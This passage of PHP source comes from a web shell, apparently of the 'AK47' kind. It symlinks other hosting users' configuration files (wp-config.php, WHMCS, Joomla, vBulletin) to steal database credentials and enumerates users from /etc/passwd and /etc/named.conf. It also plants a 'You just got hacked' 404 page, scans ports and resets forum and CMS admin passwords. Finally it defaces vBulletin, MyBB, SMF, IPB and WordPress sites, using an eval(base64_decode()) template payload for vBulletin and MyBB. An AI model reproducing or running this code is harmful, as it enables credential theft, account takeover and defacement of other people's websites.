			symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb7.txt');
			symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		}
		if(isset($_REQUEST['passwd']))
		{
			$getetc = trim($_REQUEST['passwd']);
			
			mkdir("AK47");
			chdir("AK47");
					
			$myfile = fopen("test.txt","w");
			fputs($myfile,$getetc);
			fclose($myfile);
						 
			$file = fopen("test.txt", "r") or exit("Unable to open file!");
			while(!feof($file))
			{
				$s = fgets($file);
				$matches = array();
				$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
				$matches = str_replace("home/","",$matches[1]);
				if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
						continue;
					syml($matches,$matches);
			}
			fclose($file);
			unlink("test.txt");
			echo "<center><font class=txt size=3>[ Done ]</font></center>";
			echo "<br><center><a href=".$url."AK47 target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
		
		}
		else
		{
			$d0mains = @file("/etc/named.conf");
		if($d0mains)
		{
			mkdir("AKST");
			chdir("AKST");
								
			foreach($d0mains as $d0main)
			{
				if(eregi("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
							
					if(strlen(trim($domains[1][0])) > 2)
					{ 
						$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
									
						syml($user['name'],$domains[1][0]);					
					}
				}
			}
			echo "<center><font class=txt size=3>[ Done ]</font></center>";
			echo "<br><center><a href=".$url."AKST target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
		}
		else
		{
			mkdir("AK47");
			chdir("AK47");
			$temp = "";
			$val1 = 0;
			$val2 = 1000;
			for(;$val1 <= $val2;$val1++) 
			{
				$uid = @posix_getpwuid($val1);
				if ($uid)
					$temp .= join(':',$uid)."\n";
			 }
			 echo '<br/>';
			 $temp = trim($temp);
			 
			 $file5 = fopen("test.txt","w");
			 fputs($file5,$temp);
			 fclose($file5);
						 

			 $file = fopen("test.txt", "r") or exit("Unable to open file!");
			 while(!feof($file))
			 {
				$s = fgets($file);
				$matches = array();
				$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
				$matches = str_replace("home/","",$matches[1]);
				if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
					continue;
				syml($matches,$matches);
			 }
			fclose($file);
			echo "</table>";
			unlink("test.txt");
			echo "<center><font class=txt size=3>[ Done ]</font></center>";
			echo "<br><center><a href=".$url."AK47 target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
		}
	}
	}
	else
		echo "<center>Cannot Complete the task!!!!</center>";
	
}
else if(isset($_GET["symlinkfile"])) 
{
	if(!isset($_GET['file']))
	{
		?>
		<center>
			<form onSubmit="getdata('symlinkmyfile',file.value);return false;">
			<input type="text" class="box" name="file" size="50" value="/etc/passwd">
			<input type="button" value="Create Symlink" onClick="getdata('symlinkmyfile',file.value)" class="but">
			</form></center>
			<br><br>
		<?php
	}
}
 
else if(isset($_GET['symlinkmyfile']))
{
	if(stristr(php_uname(),"Linux"))
	{
		$fakedir="cx";
		$fakedep=16;
				
		$num=0; // offset of symlink.$num
				
		if(!empty($_GET['myfile']))
			$file=$_GET['myfile'];
		else $file="";
											
		if(empty($file))
		exit;
						
		if(!is_writable("."))
			echo "not writable directory";
					
		$level=0;
				
		for($as=0;$as<$fakedep;$as++)
		{
			if(!file_exists($fakedir))
				mkdir($fakedir);
				chdir($fakedir);
		}
						
		while(1<$as--) chdir("..");
				
		$hardstyle = explode("/", $file);
				
		for($a=0;$a<count($hardstyle);$a++)
		{
			if(!empty($hardstyle[$a]))
			{
				if(!file_exists($hardstyle[$a])) 
					mkdir($hardstyle[$a]);
					chdir($hardstyle[$a]);
					$as++;
			}
		}
			$as++;
			while($as--)
					chdir("..");
					
			@rmdir("fakesymlink");
			@unlink("fakesymlink");
					
			@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");
					
			while(1)
			if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file, "symlink".$num))) break;
			else $num++;
					
			@unlink("fakesymlink");
			mkdir("fakesymlink");
						
			echo '<CENTER>check symlink <a href="./symlink'.$num.'">symlink'.$num.'</a> file</CENTER>';
	}
	else
		echo '<CENTER>Cannot Create Symlink</CENTER>';		
}
else if(isset($_REQUEST['404new']))
{
	?>
	<form>
	<center><textarea name=message cols=100 rows=18 class=box>lol! You just got hacked</textarea></br>
	<input type="button" onClick="my404page(message.value)" value="  Save  " class=but></center>
	</br>
	</form>
	<?php
}
else if(isset($_REQUEST['404page']))
{
	$url = $_SERVER['REQUEST_URI'];
	$path=explode('/',$url);
	$url =str_replace($path[count($path)-1],'',$url);
	if(isset($_POST['message']))
	{
		if($myfile = fopen(".htaccess", "a"))
		{
			fwrite($myfile, "ErrorDocument 404 ".$url."404.html \n\r"); 
			if($myfilee = fopen("404.html", "w+"))
			{
				fwrite($myfilee, $_POST['message']);
			}
			echo "<center><font class=txt>Done setting 404 Page !!!!</font></center>";
		}
			else
				echo "<center>Cannot Set 404 Page</center>";
	}
	else if(strlen($ind) != 0)
	{
		if($myfile = fopen(".htaccess", "a"))
		{
			fwrite($myfile, "ErrorDocument 404 ".$url."404.html \n\r"); 
	
			if($myfilee = fopen("404.html", "w+"))
			{
				fwrite($myfilee, base64_decode($ind));
			
				fclose($myfilee);
				echo "<center><font class=txt>Done setting 404 Page !!!!</font></center>";
			}
			fclose($myfile);	
		}
		else
		{
			echo "<center>Cannot Set 404 Page</center>";
		}
	}
	else
		echo "<center>Nothing Specified in the shell</center>";
}
else if(isset($_GET["domains"])) 
{
	?><center><iframe src="<?php echo 'http://sameip.org/ip/' . getenv('SERVER_ADDR'); ?>" width="80%" height="1000px"></iframe></center><?php 
}
else if(isset($_GET["symlink"])) 
{
	$d0mains = @file("/etc/named.conf");
	$url = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
	$path=explode('/',$url);
	$url =str_replace($path[count($path)-1],'',$url);
	if($d0mains)
	{ 
   		@mkdir("AK",0777);
		@chdir("AK");
		execmd("ln -s / root");
		$file3 = 'Options all 
	 DirectoryIndex Sux.html 
	 AddType text/plain .php 
	 AddHandler server-parsed .php 
	  AddType text/plain .html 
	 AddHandler txt .html 
	 Require None 
	 Satisfy Any        
	';
		$fp3 = fopen('.htaccess','w');
		$fw3 = fwrite($fp3,$file3);
		@fclose($fp3);
		echo "<table align=center border=1 style='width:60%;border-color:#333333;'><tr align =center><td align=center><font size=3 >S. No.</font></td><td align=center><font size=3 >Domains</font></td><td align=center><font size=3 >Users</font></td><td align=center><font size=3 >Symlink</font></td><td align=center><font size=3 >Information</font></td></tr>";
				
		$dcount = 1;
		foreach($d0mains as $d0main)
		{
			if(eregi("zone",$d0main))
			{
				preg_match_all('#zone "(.*)"#', $d0main, $domains);
				flush();
					
				if(strlen(trim($domains[1][0])) > 2)
				{ 
					$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
						
					echo "<tr align=center><td><font class=txt>" . $dcount . "</font></td><td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td><td><font class=txt>".$user['name']."</font></td><td><a href=".$url."AK/root/home/".$user['name']."/public_html target='_blank'><font class=txt>Symlink</font></a></td><td><font class=txt><a href=?info=".$domains[1][0]." target=_blank>info</a></font></td></tr>"; flush();
					$dcount++;
				}
			}
			
		}
		echo "</table>";
	}
	else
	{
		if(stristr(php_uname(),"Linux"))
		{
			?>
			<div style="float:left;position:fixed;">
			<form>
			<table cellpadding="9">
				<tr>
					<th colspan="2">Get User Name</th>
				</tr>
				<tr>
					<td>Enter Website Name :</td>
					<td><input type="text" name="sitename" value="sitename.com" class="sbox"></td>
				</tr>
				<tr>
					<td align="center" colspan="2"><input type="button" onClick="getname(sitename.value)" value="   Get IT  " class="but"></td>
				</tr>
				<tr>
					<td colspan=2 align=center><div style="width:250px;" id="showsite"></div></td>
				</tr>
			</table>
			</form>
			</div>
			<?php
			$TEST=@file('/etc/passwd');
			if ($TEST) 
			{
				@mkdir("AK",0777);
				@chdir("AK");
				execmd("ln -s / root");
				$file3 = 'Options all 
				 DirectoryIndex Sux.html 
				 AddType text/plain .php 
				 AddHandler server-parsed .php 
				  AddType text/plain .html 
				 AddHandler txt .html 
				 Require None 
				 Satisfy Any        
				';
				$fp3 = fopen('.htaccess','w');
				$fw3 = fwrite($fp3,$file3);
				@fclose($fp3);
							
				echo "<table align=center border=1 style='width:40%;border-color:#333333;'><tr><td align=center><font size=4 >S. No.</font></td><td align=center><font size=4 >Users</font></td><td align=center><font size=3 >Symlink</font></td></tr>";
						
				$dcount = 1;
				$file = fopen("/etc/passwd", "r");
				//Output a line of the file until the end is reached
				while(!feof($file))
				{
					$s = fgets($file);
					$matches = array();
					$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
					$matches = str_replace("home/","",$matches[1]);
					if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
						continue;
					echo "<tr><td align=center><font size=3 class=txt>" . $dcount . "</td><td align=center><font size=3 class=txt>" . $matches . "</td>";
					echo "<td align=center><font size=3 class=txt><a href=".$url."AK/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
					$dcount++;
				}
				fclose($file);
						
				echo "</table>";
			}
			else
			{
				@mkdir("AK",0777);
				@chdir("AK");
				execmd("ln -s / root");
				$file3 = 'Options all 
				 DirectoryIndex Sux.html 
				 AddType text/plain .php 
				 AddHandler server-parsed .php 
				  AddType text/plain .html 
				 AddHandler txt .html 
				 Require None 
				 Satisfy Any        
				';
				$fp3 = fopen('.htaccess','w');
				$fw3 = fwrite($fp3,$file3);
				@fclose($fp3);
				
				echo "<table align=center border=1 style='width:40%;border-color:#333333;'><tr><td align=center><font size=4 >S. No.</font></td><td align=center><font size=4 >Users</font></td><td align=center><font size=3 >Symlink</font></td></tr>";
						
				$temp = "";
				$val1 = 0;
				$val2 = 1000;
				for(;$val1 <= $val2;$val1++) 
				{
					$uid = @posix_getpwuid($val1);
					if ($uid)
					 $temp .= join(':',$uid)."\n";
				 }
				 echo '<br/>';
				 $temp = trim($temp);
				 
				 $file5 = fopen("test.txt","w");
				 fputs($file5,$temp);
				 fclose($file5);
					 
				 $dcount = 1;
				 $file = fopen("test.txt", "r");
				 while(!feof($file))
				 {
					$s = fgets($file);
					$matches = array();
					$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
					$matches = str_replace("home/","",$matches[1]);
					if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
						continue;
					echo "<tr><td align=center><font size=3 class=txt>" . $dcount . "</td><td align=center><font size=3 class=txt>" . $matches . "</td>";
					echo "<td align=center><font size=3 class=txt><a href=".$url."AK/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
					$dcount++;
				 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
			}
		}
		else
			echo "<center><font size=4 >Cannot create Symlink</font></center>";
	}
}
else if(isset($_GET['host']) && isset($_GET['protocol']))
{
	echo "Open Ports: ";
	$host = $_GET['host'];
	$proto = $_GET['protocol'];
	$myports = array("21","22","23","25","59","80","113","135","445","1025","5000","5900","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018");
	for($current = 0; $current <= 23; $current++)
	{
		$currents = $myports[$current];
		$service = getservbyport($currents, $proto);
		// Try to connect to port
		$result = fsockopen($host, $currents, $errno, $errstr, 1);
		// Show results
		if($result)
			echo "<font class=txt>$currents, </font>";
	}
}
else if(isset($_REQUEST['forumpass']))
{
		$localhost =  $_GET['f1']; 
		$database =  $_GET['f2']; 
		$username =  $_GET['f3']; 
		$password =  $_GET['f4']; 
		$prefix    =  $_GET['prefix'];
		$newpass = $_GET['newpass'];
		$uid = $_GET['uid'];
		
		if($_GET['forums'] == "vb")
		{	
			$newpass = $_GET['newipbpass'];
			$uid = $_GET['ipbuid'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			$salt = "eghjghrtd";
			$newpassword = md5(md5($newpass) . $salt);
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update user set password = '$newpassword', salt = '$salt' where userid = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."user set password = '$newpassword', salt = '$salt' where userid = '$uid'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "mybb")
		{	
			$newpass = $_GET['newipbpass'];
			$uid = $_GET['ipbuid'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			$salt = "jeghj";
			$newpassword = md5(md5($salt).md5($newpass));
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update mybb_users set password = '$newpassword', salt = '$salt' where uid = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."users set password = '$newpassword', salt = '$salt' where uid = '$uid'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "smf")
		{	
			$newpass = $_GET['newipbpass'];
			$uid = $_GET['ipbuid'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
							
			if($prefix == "" || $prefix == null)
			{
				$result = mysql_query("select member_name from smf_members where id_member = $uid");
				$row = mysql_fetch_array($result);
				$membername = $row['member_name'];
				$newpassword = sha1(strtolower($membername).$newpass);
				$sql = mysql_query("update smf_members set passwd = '$newpassword' where id_member = '$uid'");
			}
			else

			{
				$result = mysql_query("select member_name from ".$prefix."members where id_member = $uid");
				$row = mysql_fetch_array($result);
				$membername = $row['member_name'];
				$newpassword = sha1(strtolower($membername).$newpass);
				$sql = mysql_query("update ".$prefix."members set passwd = '$newpassword' where id_member = '$uid'");
			}
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "phpbb")
		{	
			$newpass = $_POST['newipbpass'];
			$uid = $_POST['ipbuid'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			
			$newpassword = md5($newpass);
			if(empty($prefix) || $prefix == null)
				$sql = mysql_query("update phpb_users set user_password = '$newpassword' where user_id = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."users set user_password = '$newpassword' where user_id = '$uid'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "ipb")
		{
			$newpass = $_POST['newipbpass'];
			$uid = $_POST['ipbuid'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);
			$salt = "eghj";
			$newpassword = md5(md5($salt).md5($newpass));
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update members set members_pass_hash = '$newpassword', members_pass_salt = '$salt' where member_id = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."members set members_pass_hash = '$newpassword', members_pass_salt = '$salt' where member_id = '$uid'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "wp")
		{	
			$uname = $_GET['uname'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);

			$newpassword = md5($newpass);
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update wp_users set user_pass = '$newpassword', user_login = '$uname' where ID = '$uid'");
			else
				$sql = mysql_query("update ".$prefix."users set user_pass = '$newpassword', user_login = '$uname' where ID = '$uid'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
		else if($_GET['forums'] == "joomla")
		{	
			$newjoomlapass = $_GET['newjoomlapass'];
			$joomlauname = $_GET['username'];
			$con = mysql_connect($localhost,$username,$password);
			$db = mysql_select_db($database,$con);

			$newpassword = md5($newjoomlapass);
			if($prefix == "" || $prefix == null)
				$sql = mysql_query("update jos_users set password = '$newpassword', username = '$joomlauname' where name = 'Super User'");
			else
				$sql = mysql_query("update ".$prefix."users set password = '$newpassword', username = '$joomlauname' where name = 'Super User' OR name = 'Administrator'");
			if($sql)
			{
				mysql_close($con);
				echo "<font class=txt>Password Changed Successfully</font>";
			}
			else
				echo "Cannot Change Password";
		}
}
else if(isset($_POST['forumdeface']))
{
	$localhost =  $_POST['f1']; 
	$database =  $_POST['f2']; 
	$username =  $_POST['f3']; 
	$password =  $_POST['f4']; 
	$index    =  $_POST['index'];
	$prefix    =  $_POST['tableprefix'];
	
	if($_POST['forumdeface'] == "vb")
	{
		$con =@ mysql_connect($localhost,$username,$password); 
		$db =@ mysql_select_db($database,$con);  
		$index=str_replace('"','\\"',$index); 
		$attack  = "{\${eval(base64_decode(\'"; 
		$attack .= base64_encode("echo \"$index\";"); 
		$attack .= "\'))}}{\${exit()}}</textarea>"; 
		if($prefix == "" || $prefix == null)
				$query = "UPDATE template SET template = '$attack'"; 
		else
			$query = "UPDATE ".$prefix."template SET template = '$attack'"; 
		$result =@ mysql_query($query,$con); 
		if($result)
			echo "<center><font class=txt size=4><blink>Vbulletin Forum Defaced Successfully</blink></font></center>";
		else
			echo "<center><font  size=4><blink>Cannot Deface Vbulletin Forum</blink></font></center>";
	}
	else if($_POST['forumdeface'] == "mybb")
	{
		$con =@ mysql_connect($localhost,$username,$password); 
		$db =@ mysql_select_db($database,$con);  
		$attack  = "{\${eval(base64_decode(\'"; 
		$attack .= base64_encode("echo \"$index\";"); 
		$attack .= "\'))}}{\${exit()}}</textarea>"; 
		$attack  = str_replace('"',"\\'",$attack);
			
		if($prefix == "" || $prefix == null)
			$query = "UPDATE mybb_templates SET template = '$attack'"; 
		else
		$query = "UPDATE ".$prefix."templates SET template = '$attack'"; 
		$result =@ mysql_query($query,$con);
		if($result)
			echo "<center><font class=txt size=4><blink>Mybb Forum Defaced Successfully</blink></font></center>";
		else
			echo "<center><font  size=4><blink>Cannot Deface Mybb Forum</blink></font></center>";
	}
	else if($_POST['forumdeface'] == "smf")
	{
		$head    =  $_POST['head'];
		$catid    =  $_POST['f5'];
						
		$con =@ mysql_connect($localhost,$username,$password); 
		$db =@ mysql_select_db($database,$con);  
		if($prefix == "" || $prefix == null)
			$query = "UPDATE boards SET name='$head', description='$index' WHERE id_cat='$catid'"; 
		else
			$query = "UPDATE ".$prefix."boards SET name='$head', description='$index' WHERE id_cat='$catid'"; 
		$result =@ mysql_query($query,$con);
		if($result)
			echo "<center><font class=txt size=4><blink>SMF Forum Index Changed Successfully</blink></font></center>";
		else
			echo "<center><font  size=4><blink>Cannot Deface SMF Forum</blink></font></center>";
	}
	else if($_POST['forumdeface'] == "ipb")
	{
		$head    =  $_POST['head'];
		$catid    =  $_POST['f5'];
							
		$IPB = "forums";
		$con =@ mysql_connect($localhost,$username,$password); 
		$db =@ mysql_select_db($database,$con);
		if($prefix == "" || $prefix == null)
			$result =@mysql_query($query = "UPDATE $IPB SET name = '$head', description = '$index' where id = '$catid'"); 
		else
			$result =@mysql_query($query = "UPDATE $prefix.$IPB SET name = '$head', description = '$index' where id = '$catid'");
		if($result)
			echo "<center><font class=txt size=4><blink>Forum Defaced Successfully</blink></font></center>";
		else
			echo "<center><font  size=4><blink>Cannot Deface Forum</blink></font></center>";
	}
	else if($_POST['forumdeface'] == "wp")
	{
		$catid = $_POST['f5'];
		$head    =  $_POST['head'];
				
		$con =@ mysql_connect($localhost,$username,$password); 
		$db =@ mysql_select_db($database,$con);  
		if($prefix == "" || $prefix == null)
		{
			if(isset($_POST["alll"]) && $_POST["alll"] == "All")
				$query = "UPDATE wp_posts SET post_title='$head', post_content='$index'"; 
			else
				$query = "UPDATE wp_posts SET post_title='$head', post_content='$index' WHERE ID='$catid'"; 
		}
		else
		{
			if(isset($_POST["alll"]) && $_POST["alll"] == "All")
				$query = "UPDATE ".$prefix."posts SET post_title='$head', post_content='$index'";
			else
				$query = "UPDATE ".$prefix."posts SET post_title='$head', post_content='$index' WHERE ID='$catid'";
					
		}
		$result =@mysql_query($query,$con) or mysql_error();
		if($result)
			echo "<center><font class=txt size=4><blink>Wordpress Defaced Successfully</blink></font></center>";
		else
			echo "<center><font  size=4><blink>Cannot Deface Wordpress</blink></font></center>";
	}
	else if($_POST['forumdeface'] == "joomla")
	{
		$site_url = $_POST['siteurl'];
		$dbprefix = $_POST['tableprefix'];
		$dbname =  $_POST['f2']; 
		$h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['index']))))."'))); exit; ?>";
		
		function randomt() 
		{ 
			$chars = "abcdefghijkmnopqrstuvwxyz023456789"; 
			srand((double)microtime()*1000000); 
			$i = 0; 
			$pass = '' ; 
					
			while ($i <= 7) 
			{ 
				$num = rand() % 33; 
				$tmp = substr($chars, $num, 1); 
				$pass = $pass . $tmp; 
				$i++; 
			} 
					
			return $pass; 
		}
		function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
		{
			$ar0=explode($marqueurDebutLien, $text);
			$ar1=explode($marqueurFinLien, $ar0[$i]);
			$ar=trim($ar1[0]);
			return $ar;
		}
		$co=randomt();
					
		$link=mysql_connect($localhost,$username,$password) ;
		mysql_select_db($dbname,$link);
				
	    $tryChaningInfo = mysql_query("UPDATE ".$dbprefix."users SET username ='admin' , password = '2a9336f7666f9f474b7a8f67b48de527:DiWqRBR1thTQa2SvBsDqsUENrKOmZtAX'");
											 
		$req =mysql_query("SELECT * from  `".$dbprefix."extensions` ");
						 
		if ( $req )
		{
